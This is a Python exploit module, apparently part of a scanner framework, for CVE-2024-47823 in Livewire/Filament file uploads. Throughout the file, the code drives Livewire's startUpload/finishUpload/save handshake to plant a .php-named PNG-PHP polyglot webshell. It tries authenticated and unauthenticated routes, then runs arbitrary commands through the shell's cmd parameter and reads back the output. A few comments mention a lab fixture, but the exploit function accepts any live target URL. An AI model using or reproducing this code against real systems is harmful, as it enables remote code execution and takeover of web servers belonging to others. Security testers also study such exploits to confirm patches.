# Pages that host the vulnerable logo FileUpload component, most likely first.
# {cid} is substituted with the current company id discovered after login.
_AUTH_UPLOAD_PAGES = (
    "/company/{cid}/settings/company",
)
# The Filament FileUpload field name (statePath, container root is null here so it
# is top-level) and the public-disk subdirectory preserveFilenames() lands it in.
_AUTH_FIELD = "logo"
_AUTH_STORAGE_DIR = "logos/company"

# Lab-only public upload page. It validates a TemporaryUploadedFile as an image,
# then stores it by getClientOriginalName() on the public disk.
_PUBLIC_LW2_UPLOAD_PAGES = (
    "/upload",
    "/file-upload",
    "/upload-logo",
    "/",
)
_PUBLIC_LW2_FIELD = "upload"
_PUBLIC_LW2_SAVE_METHOD = "save"
_PUBLIC_LW2_STORAGE_DIR = "lab-uploads"



def _filament_login(session: requests.Session, root: str, username: str,
                    password: str, timeout: int = 15) -> bool:
    """Log into the filament-companies panel via the classic POST /login form.

    Returns True when the session is authenticated (a subsequent /company is not
    bounced back to /login).
    """
    login_url = urljoin(root + "/", _LOGIN_PATH.lstrip("/"))
    r = session.get(login_url, timeout=timeout, verify=False)
    if r.status_code != 200:
        return False
    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text) \
        or re.search(r'value="([^"]+)"\s+name="_token"', r.text)
    if not m:
        return False
    token = html.unescape(m.group(1))
    session.post(
        login_url,
        data={"_token": token, "email": username, "password": password},
        timeout=timeout, verify=False, allow_redirects=True,
    )
    # Confirm: /company should now resolve (not redirect to /login).
    chk = session.get(urljoin(root + "/", "company"), timeout=timeout, verify=False,
                      allow_redirects=True)
    return chk.status_code == 200 and not chk.url.rstrip("/").endswith("/login")


def _discover_company_id(session: requests.Session, root: str, timeout: int = 15) -> Optional[str]:
    """Scrape the current company id from the panel landing page links
    (e.g. /company/1/settings/company)."""
    r = session.get(urljoin(root + "/", "company"), timeout=timeout, verify=False,
                    allow_redirects=True)
    m = re.search(r'/company/(\d+)/settings/', r.text)
    return m.group(1) if m else "1"


def _find_lw2_upload_component(session: requests.Session, page_url: str,
                              field: str, timeout: int = 15) -> Optional[Dict]:
    """GET a Filament page and return the Livewire-2 component that exposes `field`.

    Picks the component whose serverMemo.data carries the form field at top level
    (the EditFormRecord, not the page wrapper). Returns fingerprint/serverMemo/csrf.
    """
    r = session.get(page_url, timeout=timeout, verify=False, allow_redirects=True)
    if r.status_code != 200 or not r.text:
        return None
    body = r.text
    csrf_m = re.search(r'name="csrf-token"\s+content="([^"]+)"', body)
    if not csrf_m:
        return None
    csrf = html.unescape(csrf_m.group(1))
    for m in re.finditer(r'wire:initial-data="([^"]+)"', body):
        try:
            comp = json.loads(html.unescape(m.group(1)))
        except (ValueError, TypeError):
            continue
        data = (comp.get("serverMemo") or {}).get("data") or {}
        if field in data:
            return {
                "fingerprint": comp["fingerprint"],
                "serverMemo": comp["serverMemo"],
                "name": comp["fingerprint"]["name"],
                "csrf": csrf,
            }
    return None


def _lw2_message(session: requests.Session, root: str, name: str, fingerprint: dict,
                 server_memo: dict, csrf: str, updates: list, timeout: int = 20):
    """POST a Livewire-2 /livewire/message/{name} update; return (merged_serverMemo, effects).

    Livewire 2 returns a PARTIAL serverMemo (changed data keys + new checksum). We
    deep-merge into the prior serverMemo so the checksum stays consistent with the
    full data set — sending a wholesale/coerced serverMemo triggers
    CorruptComponentPayloadException (HTTP 500). Raises on non-200.
    """
    url = urljoin(root + "/", "livewire/message/" + name.lstrip("/"))
    r = session.post(
        url,
        json={"fingerprint": fingerprint, "serverMemo": server_memo, "updates": updates},
        headers={"X-CSRF-TOKEN": csrf, "X-Livewire": "true"},
        timeout=timeout, verify=False,
    )
    if r.status_code != 200:
        raise requests.RequestException(f"{url} -> HTTP {r.status_code}: {r.text[:200]}")
    data = r.json()
    merged = json.loads(json.dumps(server_memo))  # deep copy
    for k, v in (data.get("serverMemo") or {}).items():
        if k == "data" and isinstance(v, dict) and isinstance(merged.get("data"), dict):
            merged["data"].update(v)
        else:
            merged[k] = v
    return merged, (data.get("effects") or {})


def _lw2_sync_input(session: requests.Session, root: str, name: str, fingerprint: dict,
                    server_memo: dict, csrf: str, state_path: str, value: str):
    """Mirror Livewire's browser-side input sync after a file upload finishes.

    Livewire 2 emits upload:finished for FileUpload state paths such as
    ``logo.<uuid>``. The browser then syncs that state path before the form save.
    Without this step, repeat runs can re-save an existing logo value while the
    newly uploaded temp file is discarded.
    """
    return _lw2_message(
        session, root, name, fingerprint, server_memo, csrf,
        [{"type": "syncInput", "payload": {
            "id": "si",
            "name": state_path,
            "value": value,
        }}],
    )


def _candidate_public_lw2_pages(base_url: str, route_map=None, detection=None,
                                detection_artifacts=None, probe_hint=None):
    """Small, lab-focused candidate set for public Livewire-2 upload components."""
    base = base_url.rstrip("/") if base_url else ""
    parsed = urlparse(base)
    root = f"{parsed.scheme}://{parsed.netloc}"
    route_map = route_map or {}
    paths = []

    if probe_hint and probe_hint != "/":
        paths.append(probe_hint)

    artifacts = {}
    if isinstance(detection_artifacts, dict):
        artifacts.update(detection_artifacts)
    if isinstance(detection, dict):
        artifacts.update(detection.get("artifacts", {}) or {})

    def _push(value):
        if not value:
            return
        value = str(value)
        if value.startswith(("http://", "https://")):
            try:
                paths.append(urlparse(value).path or "/")
            except Exception:
                return
        else:
            paths.append(value)

    _push(artifacts.get("upload_component_url"))
    comp = artifacts.get("livewire_upload_component")
    if isinstance(comp, dict):
        _push(comp.get("page_url"))

    for path in _candidate_upload_component_paths(route_map):
        if "upload" in path.lower():
            paths.append(path)
    paths.extend(_PUBLIC_LW2_UPLOAD_PAGES)

    urls = []
    for path in _dedupe(paths):
        if path.startswith(("http://", "https://")):
            urls.append(path)
        elif path == "/":
            urls.append(root)
        else:
            urls.append(urljoin(root + "/", path.lstrip("/")))
    return _dedupe(urls)


def _clean_polyglot_response(body: str) -> str:
    """Strip the leading PNG bytes from a PHP/polyglot response body."""
    if not body:
        return ""
    marker = body.rfind("IEND")
    if marker != -1:
        after = body.find("\n", marker)
        if after != -1:
            return body[after + 1:].strip() or body.strip()
    marker = body.find("\n", body.find("PNG")) if "PNG" in body else -1
    return (body[marker + 1:].strip() if marker != -1 else body.strip()) or body.strip()


def _exploit_public_lw2_upload(
    session: requests.Session, base_url: str, root: str, cmd: str, result: dict,
    *, route_map=None, detection=None, detection_artifacts=None, probe_hint=None,
) -> dict:
    """Unauthenticated Livewire-2 upload validation bypass used by the 37001 lab."""
    component = None
    page_url = None
    for candidate in _candidate_public_lw2_pages(
        base_url,
        route_map=route_map,
        detection=detection,
        detection_artifacts=detection_artifacts,
        probe_hint=probe_hint,
    ):
        component = _find_lw2_upload_component(session, candidate, _PUBLIC_LW2_FIELD)
        if component:
            page_url = candidate
            break

    if not component:
        result["reason"] = "no public Livewire-2 upload component found"
        result["detail"] = "target does not expose the unauthenticated Livewire-2 upload page"
        return result

    fingerprint = component["fingerprint"]
    server_memo = component["serverMemo"]
    csrf = component["csrf"]
    name = component["name"]
    state_path = _PUBLIC_LW2_FIELD
    shell_name = "poc" + uuid.uuid4().hex[:8] + ".php"
    payload = _build_png_php_polyglot()

    server_memo, effects = _lw2_message(
        session, root, name, fingerprint, server_memo, csrf,
        [{"type": "callMethod", "payload": {"id": "su", "method": "startUpload",
          "params": [state_path, [{"name": shell_name, "size": len(payload), "type": "image/png"}], False]}}],
    )
    signed_url = None
    for ev in effects.get("emits", []) or []:
        if ev.get("event") == "upload:generatedSignedUrl":
            signed_url = ev["params"][1]
            break
    if not signed_url:
        result["reason"] = "no signed upload URL returned by public startUpload"
        result["detail"] = "Livewire-2 upload handshake blocked (possibly patched/protected)"
        return result

    up = session.post(
        signed_url,
        files={"files[]": (shell_name, payload, "image/png")},
        headers={"X-CSRF-TOKEN": csrf}, timeout=20, verify=False,
    )
    if up.status_code not in (200, 201):
        result["reason"] = f"signed upload rejected (HTTP {up.status_code})"
        result["detail"] = "webshell upload to signed URL failed"
        return result
    try:
        tmp_paths = up.json().get("paths", [])
    except (ValueError, TypeError):
        tmp_paths = []
    if not tmp_paths:
        result["reason"] = "no temp path returned from public signed upload"
        result["detail"] = "upload endpoint did not park the webshell"
        return result

    server_memo, _ = _lw2_message(
        session, root, name, fingerprint, server_memo, csrf,
        [{"type": "callMethod", "payload": {"id": "fu", "method": "finishUpload",
          "params": [state_path, [tmp_paths[0]], False]}}],
    )

    server_memo, effects = _lw2_message(
        session, root, name, fingerprint, server_memo, csrf,
        [{"type": "callMethod", "payload": {"id": "sv", "method": _PUBLIC_LW2_SAVE_METHOD, "params": []}}],
    )
    time.sleep(1)

    shell_url = f"{root}/storage/{_PUBLIC_LW2_STORAGE_DIR}/{shell_name}"
    try:
        probe = session.get(shell_url, params={"cmd": cmd}, timeout=10, verify=False)
    except requests.RequestException as exc:
        result["reason"] = f"webshell request error: {exc}"
        result["detail"] = "upload committed but webshell fetch failed"
        return result

    if probe.status_code != 200 or not (probe.text or "").strip():
        result["reason"] = (
            f"webshell uploaded but not executing at {shell_url} "
            f"(HTTP {probe.status_code}); patched, non-public disk, or path differs"
        )
        result["detail"] = "upload committed but RCE not observed"
        return result

    body = probe.text
    if "<?php" in body or "$_GET['cmd']" in body:
        result["reason"] = "webshell returned as raw source (PHP disabled for storage)"
        result["detail"] = "upload committed but .php not executed -> no RCE"
        return result

    result["success"] = True
    result["evidence"] = _clean_polyglot_response(body)
    result["detail"] = f"unauthenticated RCE: `{cmd}` executed via {shell_name}"
    result["artifacts"] = {
        "upload_page": page_url,
        "webshell_url": f"{shell_url}?cmd=<command>",
        "shell_name": shell_name,
        "storage_dir": _PUBLIC_LW2_STORAGE_DIR,
        "command": cmd,
    }
    return result


def _exploit_authenticated_filament_lw2(
    session: requests.Session, base_url: str, root: str,
    username: str, password: str, cmd: str, result: dict,
    operator_authed: bool = False,
) -> dict:
    """Authenticated ERPSAAS (Filament v2 / Livewire 2.12.5) FileUpload -> RCE.

    Logs in (unless an operator session was supplied), drives the logo FileUpload
    through the LW2 startUpload/finishUpload/save handshake with a .php-named
    PNG-polyglot (MIME image/png), then executes `cmd` via
    /storage/logos/company/<name>.php?cmd=. Mutates and returns `result`.
    """
    if not operator_authed:
        if not (username and password):
            result["reason"] = "authenticated path needs -U/-P (sink is behind the Filament login)"
            result["detail"] = "no credentials supplied for the authenticated ERPSAAS upload component"
            return result

        if not _filament_login(session, root, username, password):
            result["reason"] = "Filament login failed (bad credentials or login route moved)"
            result["detail"] = f"could not authenticate at {root}/login"
            return result

    cid = _discover_company_id(session, root)
    component = None
    for tmpl in _AUTH_UPLOAD_PAGES:
        page_url = urljoin(root + "/", tmpl.format(cid=cid).lstrip("/"))
        component = _find_lw2_upload_component(session, page_url, _AUTH_FIELD)
        if component:
            break
    if not component:
        result["reason"] = "no authenticated Livewire-2 upload component found"
        result["detail"] = "logged in but the logo FileUpload component was not located"
        return result

    fingerprint = component["fingerprint"]
    server_memo = component["serverMemo"]
    csrf = component["csrf"]
    name = component["name"]

    # Filament uploads to "{statePath}.{fileKey}" -> a keyed array {uuid: file}.
    file_key = str(uuid.uuid4())
    state_path = f"{_AUTH_FIELD}.{file_key}"
    shell_name = "poc" + uuid.uuid4().hex[:8] + ".php"
    payload = _build_png_php_polyglot()

    # Step 1: startUpload -> signed /livewire/upload-file URL.
    server_memo, effects = _lw2_message(
        session, root, name, fingerprint, server_memo, csrf,
        [{"type": "callMethod", "payload": {"id": "su", "method": "startUpload",
          "params": [state_path, [{"name": shell_name, "size": len(payload), "type": "image/png"}], False]}}],
    )
    signed_url = None
    for ev in effects.get("emits", []) or []:
        if ev.get("event") == "upload:generatedSignedUrl":
            signed_url = ev["params"][1]
            break
    if not signed_url:
        result["reason"] = "no signed upload URL returned by startUpload"
        result["detail"] = "Livewire-2 upload handshake blocked (possibly patched)"
        return result

    # Step 2: upload the polyglot bytes with a .php name and MIME image/png.
    up = session.post(
        signed_url,
        files={"files[]": (shell_name, payload, "image/png")},
        headers={"X-CSRF-TOKEN": csrf}, timeout=20, verify=False,
    )
    if up.status_code not in (200, 201):
        result["reason"] = f"signed upload rejected (HTTP {up.status_code})"
        result["detail"] = "webshell upload to signed URL failed"
        return result
    try:
        tmp_paths = up.json().get("paths", [])
    except (ValueError, TypeError):
        tmp_paths = []
    if not tmp_paths:
        result["reason"] = "no temp path returned from signed upload"
        result["detail"] = "upload endpoint did not park the webshell"
        return result
    tmp_file = tmp_paths[0]

    # Step 3: finishUpload binds the temp file to logo.{fileKey} (separate request).
    server_memo, effects = _lw2_message(
        session, root, name, fingerprint, server_memo, csrf,
        [{"type": "callMethod", "payload": {"id": "fu", "method": "finishUpload",
          "params": [state_path, [tmp_file], False]}}],
    )
    tmp_value = str(tmp_file).lstrip("/")
    server_memo, effects = _lw2_sync_input(
        session, root, name, fingerprint, server_memo, csrf, state_path, tmp_value,
    )

    # Step 4: save() -> Filament moves the temp file to logos/company/<name>.php
    # (preserveFilenames + public disk). MIME-only ->image() validation lets the
    # .php-named PNG through on Livewire 2.12.5 (the CVE).
    server_memo, effects = _lw2_message(
        session, root, name, fingerprint, server_memo, csrf,
        [{"type": "callMethod", "payload": {"id": "sv", "method": "save", "params": []}}],
    )
    time.sleep(1)

    # Step 5: trigger the webshell on the public disk.
    shell_url = f"{root}/storage/{_AUTH_STORAGE_DIR}/{shell_name}"
    try:
        probe = session.get(shell_url, params={"cmd": cmd}, timeout=10, verify=False)
    except requests.RequestException as exc:
        result["reason"] = f"webshell request error: {exc}"
        result["detail"] = "upload committed but webshell fetch failed"
        return result

    if probe.status_code != 200 or not (probe.text or "").strip():
        result["reason"] = (
            f"webshell uploaded but not executing at {shell_url} "
            f"(HTTP {probe.status_code}); patched, non-public disk, or path differs"
        )
        result["detail"] = "upload committed but RCE not observed"
        return result

    body = probe.text
    if "<?php" in body or "$_GET['cmd']" in body:
        result["reason"] = "webshell returned as raw source (mod_php not executing .php)"
        result["detail"] = "upload committed but .php not executed -> no RCE"
        return result

    # The response begins with the PNG bytes we prepended; strip to the command
    # output (everything after the IEND chunk / last NUL-ish image byte).
    marker = body.rfind("IEND")
    cleaned = body[body.find("\n", marker) + 1:].strip() if marker != -1 else body.strip()
    cleaned = cleaned or body.strip()

    result["success"] = True
    result["evidence"] = cleaned
    result["detail"] = (
        f"authenticated RCE: `{cmd}` executed via {shell_name} uploaded to the "
        f"Filament logo FileUpload (Livewire {component.get('version', '2.x')} MIME-bypass)"
    )
    result["artifacts"] = {
        "webshell_url": f"{shell_url}?cmd=<command>",
        "shell_name": shell_name,
        "storage_dir": _AUTH_STORAGE_DIR,
        "command": cmd,
        "login": f"{root}/login",
    }
    return result


def exploit(
    target_url: str,
    *,
    username: str = None,
    password: str = None,
    command: str = None,
    options: dict = None,
    session=None,
    **kwargs,
) -> dict:
    """Attempt real RCE against a live CVE-2024-47823 target. Never raises.

    Delivery paths, tried in order of likelihood:

      1. Unauthenticated Livewire-2 public /upload lab component. This is the
         37001 fixture and needs no credentials.
      2. Authenticated Filament-v2 / Livewire-2 (real ERPSAAS fallback) — when
         -U/-P are supplied. Logs into /login, drives the Company-settings logo
         FileUpload through the LW2 startUpload/finishUpload/save handshake, and
         reads the webshell back at /storage/logos/company/<name>.php.
      3. Unauthenticated Livewire-3 public /upload fallback for non-ERPSAAS targets.
         Sweeps public routes and reads /storage/<name>.php.

    Delivers `command` (default "echo CVE-2024-47823 PoC && id && hostname") via a MIME-bypassed .php upload and returns the
    contract dict; success=True only if executed command output is observed.
    """
    operator_authed = session is not None
    cmd = command or "echo CVE-2024-47823 PoC && id && hostname"
    result = {
        "cve": "CVE-2024-47823",
        "attempted": True,
        "success": False,
        "vuln_class": "rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    if not target_url:
        result["attempted"] = False
        result["reason"] = "no target_url provided"
        result["detail"] = "missing target_url"
        return result

    # The orchestrator passes detection and detection_artifacts in kwargs. Keep them local
    # so artifact handoff is deterministic and avoids repeated discovery probes.
    forced = _force_requested(options, **kwargs)
    detection = kwargs.get("detection")
    detection_artifacts = kwargs.get("detection_artifacts")
    if (
        not forced
        and isinstance(detection, dict)
        and detection.get("verdict") == "blocked_by_control"
        and detection.get("proof_type") == "upload_execution_control"
    ):
        result.update(
            success=False,
            reason=(
                "scan already proved the Livewire version is affected but PHP execution under "
                "/storage is denied by the web tier"
            ),
            detail="exploit skipped redundant upload/readback sweep because hardened upload-execution control was already confirmed",
            artifacts={
                "short_circuit_from_scan": True,
                "proof_type": detection.get("proof_type"),
                "scan_artifacts": detection.get("artifacts", {}),
            },
        )
        return result
    if forced and isinstance(detection, dict) and detection.get("verdict") == "blocked_by_control":
        result["artifacts"]["forced_scan_bypass"] = {
            "scan_verdict": detection.get("verdict"),
            "proof_type": detection.get("proof_type"),
        }

    base_url = _normalize_base(target_url)
    parsed_root = urlparse(base_url)
    root = f"{parsed_root.scheme}://{parsed_root.netloc}"
    sess = session or http_config.get_auth_session()
    sess.headers.update({"User-Agent": http_config.BROWSER_USER_AGENT, "X-lvcscan": "CVE-2024-47823"})

    route_map = _extract_route_map_from_kwargs(kwargs)
    parsed = urlparse(base_url)
    probe_hint = parsed.path if parsed.path and parsed.path != "/" else None
    root = f"{parsed.scheme}://{parsed.netloc}"

    public_lw2_failure = None
    try:
        public_result = _exploit_public_lw2_upload(
            sess, base_url, root, cmd, {**result},
            route_map=route_map,
            detection=detection,
            detection_artifacts=detection_artifacts,
            probe_hint=probe_hint,
        )
        if public_result.get("success"):
            return public_result
        public_lw2_failure = public_result
    except requests.RequestException as exc:
        public_lw2_failure = {
            **result,
            "reason": f"public Livewire-2 request error: {exc}",
            "detail": "public Livewire-2 upload attempt failed before command execution",
        }
    except Exception as exc:
        public_lw2_failure = {
            **result,
            "reason": f"public Livewire-2 unexpected error: {exc}",
            "detail": "public Livewire-2 upload attempt aborted before command execution",
        }

    # Path 2: operator session supplied (cookie-only auth) OR credentials present ->
    # try the authenticated Filament/LW2 component first.
    # If it pops, we're done. If it can't even find the authed component (e.g. target
    # is the unauth lab), fall through to the public LW3 sweep below.
    if operator_authed or (username and password):
        auth_result = _exploit_authenticated_filament_lw2(
            session or http_config.get_auth_session(), base_url, root, username, password, cmd,
            {**result}, operator_authed=operator_authed,
        )
        if auth_result.get("success"):
            return auth_result
        # Keep the authed failure reason unless the public path later succeeds.
        result = auth_result
        auth_failure = auth_result
    else:
        auth_failure = None

    try:
        # Step 1: locate a public Livewire-3 upload component via the shared helper,
        # which resolves CSRF from EITHER a <meta csrf-token> OR the XSRF-TOKEN cookie
        # (the filemanager renders no meta tag — the cookie-only path the old
        # meta-token-only discovery missed, yielding "no component found"). If the
        # caller pointed us at a specific upload page, probe that path first.
        component = None
        for page_url in _candidate_upload_paths(
            base_url,
            route_map=route_map,
            detection=detection,
            detection_artifacts=detection_artifacts,
            probe_hint=probe_hint,
        ):
            component = lw_fetch_component(sess, page_url, timeout=15)
            if component:
                break
        if not component:
            prior_failure = auth_failure or public_lw2_failure
            if prior_failure:
                prior_failure["detail"] = (
                    f"{prior_failure.get('detail') or prior_failure.get('reason')}; "
                    "public Livewire-3 fallback also found no reachable upload page"
                )
                return prior_failure
            result["reason"] = "no public Livewire upload component found"
            result["detail"] = "target does not expose a reachable Livewire upload page"
            return result
        filemanager_sink = _looks_like_filemanager_sink(component)

        # Fresh-install handling: a component that mounts with a null currentFolder
        # 500s in its upload sink (addMedia on null). Create a folder first if needed.
        component = lw_ensure_current_folder(sess, component)

        shell_name = "poc" + uuid.uuid4().hex[:8] + ".php"

        # Step 2-4: run the LW3 upload handshake on the "files" property with the LEAN
        # payload (bare PNG magic + PHP). The lean payload is NOT a structurally valid
        # PNG, so the storage sink does not attempt image conversion (which 500s on
        # hosts lacking imagewebp); _finishUpload returns a clean 200. tolerate a 500
        # anyway — some sinks persist the file before a post-store side effect fails.
        # The .php name + image/png MIME is the CVE-2024-47823 validation-bypass lie.
        upload = lw3_upload(
            sess, component,
            prop="files", filename=shell_name, payload=_WEBSHELL, mime="image/png",
            is_multiple=True, tolerate_finish_500=True,
        )
        if not upload.stored:
            result["reason"] = "no signed upload URL returned by _startUpload"
            result["detail"] = "Livewire upload handshake blocked (possibly patched/protected)"
            return result
        time.sleep(1)

        # Step 5: execute. livewire-filemanager (Spatie) serves uploads at
        # /storage/<media_id>/<name>.php (fresh DB => low ids); a simpler component
        # that stores under the original name serves at /storage/<name>.php. Try both.
        shell_paths = [f"storage/{mid}/{shell_name}" for mid in range(1, 60)]
        shell_paths.append(f"storage/{shell_name}")
        for rel in shell_paths:
            shell_url = f"{root}/{rel}"
            try:
                probe = sess.get(shell_url, params={"cmd": cmd}, timeout=10, verify=False)
            except requests.RequestException:
                continue
            if probe.status_code != 200 or not (probe.text or "").strip():
                continue
            body = probe.text
            # If mod_php is NOT executing, the body still contains the raw PHP source —
            # that is NOT code execution.
            if "<?php" in body or "$_GET['cmd']" in body:
                continue
            # Strip the leading PNG magic bytes to the command output.
            marker = body.find("\n", body.find("PNG")) if "PNG" in body else -1
            cleaned = body[marker + 1:].strip() if marker != -1 else body.strip()
            cleaned = cleaned or body.strip()

            result["success"] = True
            result["evidence"] = cleaned
            result["detail"] = f"unauthenticated RCE: `{cmd}` executed via uploaded {shell_name}"
            result["artifacts"] = {
                "webshell_url": f"{shell_url}?cmd=<command>",
                "payload": _WEBSHELL.decode("latin-1"),
                "shell_name": shell_name,
                "command": cmd,
            }
            result["note"] = (
                "this Livewire file-upload component (livewire-filemanager) is also "
                "reported by CVE-2025-14894 — same sink, no MIME validation to bypass here"
            )

            # Re-attribution: the unauth fallback proves "any reachable upload sink
            # accepts a .php" — which is the 47823 MIME-bypass ONLY when the Livewire
            # version is actually in range. Resolve the version (one detection probe,
            # paid only now that the exploit has WON) and, if the target is PATCHED
            # against 47823, re-attribute the headline/summary to CVE-2025-14894 (the
            # livewire-filemanager unrestricted-upload sink the fallback really hit).
            # The native CVE block label is preserved so the operator still sees which
            # module produced the win. See _attribution_for_fallback_success.
            try:
                _det = scan(base_url, perform_upload_test=False)
            except Exception:
                _det = None
            _vstatus = (_det or {}).get("version_status") if _det else None
            att = _attribution_for_fallback_success(_vstatus, filemanager_sink=filemanager_sink)
            if att:
                if _vstatus == "patched":
                    reason = "Livewire is PATCHED against CVE-2024-47823 (>= 3.5.2 / 2.12.7)"
                else:
                    reason = "the reached component is the livewire-filemanager unrestricted-upload sink"
                result["outcome"] = att["outcome"]
                result["outcome_tag"] = att["outcome_tag"]
                result["reattributed_cve"] = att["cve"]
                result["note"] = (
                    f"{reason}, so this proof is not a standalone CVE-2024-47823 claim: "
                    f"this RCE is the livewire-filemanager unrestricted-upload sink, "
                    f"reported as {att['cve']} (same /storage RCE). Reached via the "
                    f"CVE-2024-47823 exploit's public-upload fallback."
                )
            return result

        result["reason"] = (
            "webshell uploaded but no executing /storage/<...>/{name}.php found "
            "(no mod_php / non-public disk / path differs)".format(name=shell_name)
        )
        result["detail"] = "upload committed but RCE not observed"
        return result

    except requests.RequestException as exc:
        result["reason"] = f"request error: {exc}"
        result["detail"] = "network/HTTP error during exploitation"
        return result
    except Exception as exc:  # never raise to caller
        result["reason"] = f"unexpected error: {exc}"
        result["detail"] = "exploit aborted with an internal error"
        return result
